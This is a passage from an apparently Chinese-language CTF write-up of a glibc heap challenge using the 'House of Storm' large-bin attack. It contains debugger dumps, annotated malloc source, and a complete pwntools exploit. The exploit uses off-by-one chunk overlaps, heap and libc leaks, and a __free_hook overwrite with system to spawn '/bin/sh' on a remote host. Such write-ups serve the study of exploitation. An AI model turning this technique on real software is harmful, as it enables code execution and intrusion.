class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20gx 0x555555757020</span><br><span class="line">0x555555757020:0x49495f4d524f54530x0000000000000041</span><br><span class="line">0x555555757030:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757040:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757050:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757060:0x00000000000000000x00000000000004f1</span><br><span class="line">0x555555757070:0x00007ffff7dd1b780x00007ffff7dd1b78</span><br><span class="line">0x555555757080:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757090:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>fake后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20gx 0x555555757020</span><br><span class="line">0x555555757020:0x49495f4d524f54530x0000000000000041</span><br><span class="line">0x555555757030:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757040:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757050:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757060:0x00000000000000000x00000000000004f1</span><br><span class="line">0x555555757070:0x00000000000000000x00000000133707e0</span><br><span class="line">0x555555757080:0x524f5453504145480x0000000049495f4d</span><br><span class="line">0x555555757090:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570a0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>可以看出bk指针被改写。<br>然后fake<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p2 = p64(0)*4 + p64(0) + p64(0x4e1) # size</span><br><span class="line">p2 += p64(0) + p64(fake_chunk+8)    # bk, for creating the &quot;bk&quot; of the faked chunk to avoid crashing when unlinking from unsorted bin</span><br><span class="line">p2 += p64(0) + p64(fake_chunk-0x18-5)   # bk_nextsize, for creating the &quot;size&quot; of the faked chunk, using misalignment tricks</span><br><span class="line">update(8, p2)</span><br></pre></td></tr></table></figure></p><p>fake前<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wndbg&gt; x/20gx 0x555555757590</span><br><span class="line">0x555555757590:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557575a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557575b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557575c0:0x00000000000000000x00000000000004e1</span><br><span class="line">0x5555557575d0:0x00007ffff7dd1f980x00007ffff7dd1f98</span><br><span class="line">0x5555557575e0:0x00005555557575c00x00005555557575c0</span><br><span class="line">0x5555557575f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757600:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757610:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>fake后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x555555757590</span><br><span class="line">0x555555757590:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557575a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557575b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557575c0:0x00000000000000000x00000000000004e1</span><br><span class="line">0x5555557575d0:0x00000000000000000x00000000133707e8</span><br><span class="line">0x5555557575e0:0x00000000000000000x00000000133707c3</span><br><span class="line">0x5555557575f0:0x524f5453504145480x0000000049495f4d</span><br><span class="line">0x555555757600:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757610:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757620:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    # if the heap address starts with &quot;0x56&quot;, you win</span><br><span class="line">    alloc(0x48)     #2</span><br><span class="line">except EOFError:</span><br><span class="line">    # otherwise crash and try again</span><br><span class="line">    r.close()</span><br><span class="line">    continue</span><br></pre></td></tr></table></figure><p>当再分配一个chunk的时候，会先检查unsorted bin中有没有合适的，如果没有就把unsortbin中的chunk插入large bin中。<br>看源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             victim_index = largebin_index (size);</span><br><span class="line">             bck = bin_at (av, victim_index);</span><br><span class="line">             fwd = bck-&gt;fd;</span><br><span class="line">             ....</span><br><span class="line">             ....</span><br><span class="line">             ....</span><br><span class="line">             <span class="comment">// 如果size&lt;large bin中最后一个chunk即最小的chunk，就直接插到最后</span></span><br><span class="line">                 <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">                     &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                   &#123;</span><br><span class="line">                     fwd = bck;</span><br><span class="line">                     bck = bck-&gt;bk;</span><br><span class="line">                     victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                     fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     assert (chunk_main_arena (fwd));</span><br><span class="line">               <span class="comment">// 否则正向遍历，fwd起初是large bin第一个chunk，也就是最大的chunk。</span></span><br><span class="line">             <span class="comment">// 直到满足size&gt;=large bin chunk size</span></span><br><span class="line">                     <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                       &#123;</span><br><span class="line">                         fwd = fwd-&gt;fd_nextsize;<span class="comment">//fd_nextsize指向比当前chunk小的下一个chunk</span></span><br><span class="line">                         assert (chunk_main_arena (fwd));</span><br><span class="line">                       &#125;</span><br><span class="line">                     <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">                         == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                       <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                       fwd = fwd-&gt;fd;</span><br><span class="line">                     <span class="keyword">else</span></span><br><span class="line">                 <span class="comment">// 插入</span></span><br><span class="line">                       &#123;</span><br><span class="line">                         victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                         fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                       &#125;</span><br><span class="line">                     bck = fwd-&gt;bk;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">           &#125;</span><br><span class="line">         mark_bin (av, victim_index);</span><br><span class="line">         victim-&gt;bk = bck;</span><br><span class="line">         victim-&gt;fd = fwd;</span><br><span class="line">         fwd-&gt;bk = victim;</span><br><span class="line">         bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure></p><p>当找到插入的位置后，看源码里具体的插入操作。<br>注意large bin要维持两个双向链表，多了一个chunk size链表，所以要在两个链表中插入。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure></p><p>在此题中，fwd只可能是我们放入large bin的唯一一个chunk，而它的bk_nextsize和bk都是我们可以控制的（如上一步的改写）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"></span><br><span class="line">----&gt;fwd-&gt;bk_nextsize-&gt;fd_nextsize=victim</span><br></pre></td></tr></table></figure></p><p>victim就是我们要插入的堆地址。<br>bk_nextsize被写为0x13370800-0x20-0x18-5，那么*(0x13370800-0x20-0x18-5+0x20)=victim<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fwd-&gt;bk=victim;</span><br></pre></td></tr></table></figure></p><p>bk被写为0x13370800-0x20+8，那么*(0x13370800 -0x20+8 ) = victim。</p><p>当第一个chunk从unsorted bin插入到large bin之后，再到unsorted bin的下一个chunk，如果不满足分配则插入到large bin中。<br>而下一个chunk是我们伪造的（0x13370800-0x20）</p><p>而这个地方已经有值了，也就是我们写入的<br><em>(0x13370800-0x20-0x18-5+0x20)=</em>0x133707e3=victim<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx 0x133707e3</span><br><span class="line">0x133707e3:0x000056213c4c8060</span><br></pre></td></tr></table></figure></p><p>chunk的size，即0x13370800-0x20+0x8=0x133707e8,就是\x55或者\x56。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># if the heap address starts with &quot;0x56&quot;, you win</span><br><span class="line">    alloc(0x48)     #2</span><br></pre></td></tr></table></figure></p><p>之所以要求是\x56，因为需要满足一个检查。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||</span><br><span class="line">         av == arena_for_chunk (mem2chunk (mem)));</span><br></pre></td></tr></table></figure></p><p>即chunk的mmap标志位置位。</p><p>之前我调试的时候都是打开的ASLR，现在关掉看一下，多运行几次总能有一次成功的。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-10-073111.png" alt=""><br>去掉标志位，那么它的大小就是0x50，就满足alloc(0x48)，就会返回给我们，成功返回0x13370800-0x10之后，就是传统的做法了。</p><h3 id="leak-heap-leak-libc-覆盖free-book值为system"><a href="#leak-heap-leak-libc-覆盖free-book值为system" class="headerlink" title="leak heap,leak libc,覆盖free_book值为system"></a>leak heap,leak libc,覆盖free_book值为system</h3><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;Seize it, control it, and exploit it. Welcome to the House of Storm.&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote, process, ELF</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p32,p64,u32,u64</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'info'</span>)</span><br><span class="line">r = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof</span><span class="params">()</span>:</span></span><br><span class="line">    chal = r.recvuntil(<span class="string">'\n'</span>).strip()</span><br><span class="line">    <span class="keyword">print</span> chal</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> itertools.product(range(<span class="number">0</span>, <span class="number">0xff</span>), repeat=<span class="number">4</span>):</span><br><span class="line">        x = <span class="string">''</span>.join(map(chr, x)) </span><br><span class="line">        <span class="keyword">if</span> sha256(chal+x).digest().startswith(<span class="string">'\0\0\0'</span>):</span><br><span class="line">            r.send(x)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Not Found'</span></span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    <span class="keyword">assert</span>(<span class="number">12</span> &lt; size &lt;= <span class="number">0x1000</span>)</span><br><span class="line">    r.sendline(<span class="string">'%d'</span> % size)</span><br><span class="line">    r.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'%d'</span> % idx)</span><br><span class="line">    r.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'%d'</span> % len(content))</span><br><span class="line">    r.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line">    r.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'%d'</span> % idx)</span><br><span class="line">    r.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'4'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'%d'</span> % idx)</span><br><span class="line">    m = r.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    pos1 = m.find(<span class="string">']: '</span>) + len(<span class="string">']: '</span>)</span><br><span class="line">    pos2 = m.find(<span class="string">'\n1. '</span>)</span><br><span class="line">    <span class="keyword">return</span> m[pos1:pos2]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(host)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    port = <span class="number">5655</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        r = remote(host, port)</span><br><span class="line">        proof()</span><br><span class="line"></span><br><span class="line">        r.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line"></span><br><span class="line">        alloc(<span class="number">0x18</span>)     <span class="comment">#0</span></span><br><span class="line">        alloc(<span class="number">0x508</span>)    <span class="comment">#1</span></span><br><span class="line">        alloc(<span class="number">0x18</span>)     <span class="comment">#2</span></span><br><span class="line">        update(<span class="number">1</span>, <span class="string">'h'</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line"></span><br><span class="line">        alloc(<span class="number">0x18</span>)     <span class="comment">#3</span></span><br><span class="line">        alloc(<span class="number">0x508</span>)    <span class="comment">#4</span></span><br><span class="line">        alloc(<span class="number">0x18</span>)     <span class="comment">#5</span></span><br><span class="line">        update(<span class="number">4</span>, <span class="string">'h'</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line">        alloc(<span class="number">0x18</span>)     <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        update(<span class="number">0</span>, <span class="string">'h'</span>*(<span class="number">0x18</span><span class="number">-12</span>))    <span class="comment">#off-by-one</span></span><br><span class="line">        alloc(<span class="number">0x18</span>)     <span class="comment">#1</span></span><br><span class="line">        alloc(<span class="number">0x4d8</span>)    <span class="comment">#7</span></span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        free(<span class="number">2</span>)         <span class="comment">#backward consolidate</span></span><br><span class="line">        alloc(<span class="number">0x38</span>)     <span class="comment">#1</span></span><br><span class="line">        alloc(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">        free(<span class="number">4</span>)</span><br><span class="line">        update(<span class="number">3</span>, <span class="string">'h'</span>*(<span class="number">0x18</span><span class="number">-12</span>))    <span class="comment">#off-by-one</span></span><br><span class="line">        alloc(<span class="number">0x18</span>)     <span class="comment">#4</span></span><br><span class="line">        alloc(<span class="number">0x4d8</span>)    <span class="comment">#8</span></span><br><span class="line">        free(<span class="number">4</span>)</span><br><span class="line">        free(<span class="number">5</span>)         <span class="comment">#backward consolidate</span></span><br><span class="line">        alloc(<span class="number">0x48</span>)     <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line">        alloc(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        storage = <span class="number">0x13370000</span> + <span class="number">0x800</span></span><br><span class="line">        fake_chunk = storage - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">        p1 = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) <span class="comment">#size</span></span><br><span class="line">        p1 += p64(<span class="number">0</span>) + p64(fake_chunk)      <span class="comment">#bk</span></span><br><span class="line">        update(<span class="number">7</span>, p1)</span><br><span class="line"></span><br><span class="line">        p2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) <span class="comment">#size</span></span><br><span class="line">        p2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)    <span class="comment">#bk, for creating the "bk" of the faked chunk to avoid crashing when unlinking from unsorted bin</span></span><br><span class="line">        p2 += p64(<span class="number">0</span>) + p64(fake_chunk<span class="number">-0x18</span><span class="number">-5</span>)   <span class="comment">#bk_nextsize, for creating the "size" of the faked chunk, using misalignment tricks</span></span><br><span class="line">        update(<span class="number">8</span>, p2)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># if the heap address starts with "0x56", you win</span></span><br><span class="line">            alloc(<span class="number">0x48</span>)     <span class="comment">#2</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="comment"># otherwise crash and try again</span></span><br><span class="line">            r.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        st = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x13377331</span>) + p64(storage)</span><br><span class="line">        update(<span class="number">2</span>, st)</span><br><span class="line"></span><br><span class="line">        st = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x13377331</span>) + p64(storage) + p64(<span class="number">0x1000</span>) + p64(storage<span class="number">-0x20</span>+<span class="number">3</span>) + p64(<span class="number">8</span>)</span><br><span class="line">        update(<span class="number">0</span>, st)</span><br><span class="line"></span><br><span class="line">        leak = view(<span class="number">1</span>)</span><br><span class="line">        heap = u64(leak)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'heap: %x'</span> % heap</span><br><span class="line"></span><br><span class="line">        st = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x13377331</span>) + p64(storage) + p64(<span class="number">0x1000</span>) + p64(heap+<span class="number">0x10</span>) + p64(<span class="number">8</span>)</span><br><span class="line">        update(<span class="number">0</span>, st)</span><br><span class="line"></span><br><span class="line">        leak = view(<span class="number">1</span>)</span><br><span class="line">        unsorted_bin = u64(leak)</span><br><span class="line">        main_arena = unsorted_bin - <span class="number">0x58</span></span><br><span class="line">        libc_base = main_arena - <span class="number">0x399b00</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'libc_base: %x'</span> % libc_base</span><br><span class="line">        libc_system = libc_base + <span class="number">0x3f480</span></span><br><span class="line">        free_hook = libc_base + <span class="number">0x39b788</span></span><br><span class="line"></span><br><span class="line">        st = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x13377331</span>) + p64(storage) + p64(<span class="number">0x1000</span>) + p64(free_hook) + p64(<span class="number">0x100</span>) + p64(storage+<span class="number">0x50</span>) + p64(<span class="number">0x100</span>) + <span class="string">'/bin/sh\0'</span></span><br><span class="line">        update(<span class="number">0</span>, st)</span><br><span class="line">        update(<span class="number">1</span>, p64(libc_system))</span><br><span class="line"></span><br><span class="line">        r.sendline(<span class="string">'3'</span>)</span><br><span class="line">        r.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">        r.sendline(<span class="string">'%d'</span> % <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    host = <span class="string">'202.120.7.205'</span></span><br><span class="line">    exploit(host)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure><h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 